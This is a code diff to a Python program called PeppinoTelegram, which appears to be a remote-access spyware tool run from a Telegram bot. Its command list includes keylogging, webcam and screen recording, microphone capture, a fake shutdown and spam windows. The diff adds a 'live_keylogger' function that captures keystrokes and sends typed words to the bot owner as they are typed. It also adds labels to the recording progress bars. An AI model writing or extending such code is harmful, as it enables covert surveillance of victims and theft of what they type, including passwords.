@@ -121,6 +121,7 @@ browser - Open URL in browser.
 quickmenu - Opens a quick menu.
 waitforface - Send a webcam photo when face is detected till timeout.
 keylogger - Records pressed keys on keyboard.
+livekeylogger - Sends live updates about what's being typed on the keyboard.
 
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending an audio/voice* - Will play the audio/voice in the background.
@@ -374,9 +375,10 @@ class AsciiAnimation(EditableMessage):
                 sleep(0.5)
 
 class LoadingBar:
-    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True):
+    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None):
         self.bot = bot
         self.tot = total
+        self.label = label
         self.chat_id = chat_id
         self.showperc = showperc
         self.autodelete = autodelete
@@ -385,6 +387,7 @@ class LoadingBar:
         self.empty_char = "🔶"
         self.progress = 0
         self.done = False
+        self.deleted = False
         self.bar_lenght = 10
 
         self.bar = self.get_bar()
@@ -397,6 +400,8 @@ class LoadingBar:
         self.int_perc_progress = int(self.perc_progress)
         bar = "🔲" * (self.int_perc_progress//self.bar_lenght) + ("🔶" * ((self.bar_lenght - (self.int_perc_progress//self.bar_lenght))))
         bar = f"{bar}" + (f"{self.perc_progress}%" if self.showperc else "")
+        if self.label:
+            bar = f"{self.label}\n{bar}"
         return bar
 
     def prep_animation(self, repeat: int = 2, progress: int = 25) -> None:
@@ -424,7 +429,9 @@ class LoadingBar:
     def set_progress(self, progress: int) -> None:
         self.progress = progress
 
-    def update(self):
+    def update(self, new_progress: None|int=None):
+        if new_progress:
+            self.set_progress(new_progress)
         if self.done:
             return
         previous_bar = self.bar
@@ -436,8 +443,14 @@ class LoadingBar:
             self.ETDMessage.delete()
             self.done = True
     
+    def fill_and_delete(self) -> None:
+        self.set100()
+        self.delete()
+    
     def delete(self):
-        self.ETDMessage.delete()
+        if not self.deleted:
+            self.deleted = True
+            self.ETDMessage.delete()
     
     def set100(self):
         if self.done:
@@ -480,6 +493,7 @@ class PeppinoTelegram:
             "messagespam":self.spam_windows,
             "checkforface":self.checkforface,
             "fakeshutdown":self.fake_shutdown,
+            "livekeylogger":self.live_keylogger,
             "microphone":self.send_record_audio,
             "help":lambda: self.bsend(self.help),
             "fullclip":self.record_webcam_and_screen,
@@ -504,8 +518,8 @@ class PeppinoTelegram:
     def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
         return EditableMessage(self.bot, self.owner_id, content, autosend)
     
-    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=True) -> LoadingBar:
-        return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc)
+    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=True, label=None) -> LoadingBar:
+        return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label)
     
     def new_menu(self, menu: dict[str:Any], autosend: bool=True, label="Choose an option: ", page=0, next_btn: bool=False) -> ButtonsMenu:
         return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn)
@@ -592,6 +606,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
     def keylogger(self, timeout=10) -> None:
         buffer = StringIO()
         start=time()
+        self.bsend("Keylogger started")
         while time()-start<timeout:
             event = read_event()
             if event.event_type == KEY_DOWN:
@@ -603,7 +618,22 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
         buffer.seek(0)
         with buffer:
             self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",buffer))
-
+        self.bsend("Keylogger done")
+    
+    def live_keylogger(self, timeout=10) -> None:
+        start = time()
+        buffer = ""
+        self.bsend("Live keylogger started")
+        while time()-start < timeout:
+            event = read_event()
+            if event.event_type == KEY_DOWN:
+                e = event.name.split()[0]
+                if e in printable and not(e in " \n\t"):
+                    buffer+=e
+                else:
+                    self.bsend(f"BUFFER: {buffer}")
+                    buffer=""
+        self.bsend("Live keylogger done")
 
     def checkforface(self) -> None:
         res, frame = detect_face()
@@ -630,7 +660,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
     
     def record_screen(self, duration: int=5, caption: str|None=None) -> None:
         duration = int(duration)
-        bar = self.new_loading_bar(duration)
+        bar = self.new_loading_bar(duration, label="Recording Screen")
         try:
             filename = f"{HOME_PATH}/{randomname()}.mp4"
             audio_filename = f"{HOME_PATH}/{randomname()}.wav"
@@ -671,10 +701,11 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
             remove(final_filename)
         except Exception as e:
             self.bsend(f"Error while recording screen: {e}")
+        bar.fill_and_delete()
 
     def record_webcam(self, duration: int=5, caption: str|None=None) -> None:
         duration = int(duration)
-        bar = self.new_loading_bar(duration)
+        bar = self.new_loading_bar(duration, label="Recording Webcam")
         try:
             filename = f"{HOME_PATH}/{randomname()}.mp4"
             audio_filename = f"{HOME_PATH}/{randomname()}.wav"
@@ -716,10 +747,11 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
             remove(final_filename)
         except Exception as e:
             self.bsend(f"Error while recording webcam {e}")
+        bar.fill_and_delete()
 
     def record_webcam_and_screen(self, capture_duration: int=5, caption: str|None=None) -> None:
         capture_duration = int(capture_duration)
-        bar = self.new_loading_bar(capture_duration)
+        bar = self.new_loading_bar(capture_duration, label="Recording Webcam&Screen")
         try:
             filename = join(HOME_PATH, randomname() + ".mp4")
             audio_filename = join(HOME_PATH, randomname() + ".wav")
@@ -767,6 +799,7 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
         except Exception as e:
             e = traceback.format_exc()
             self.bsend(f"Error while sending video clip\n{e}")
+        bar.fill_and_delete()
 
     def record_audio(self, filename, seconds, samplerate=48000) -> bool|Exception:
         try:
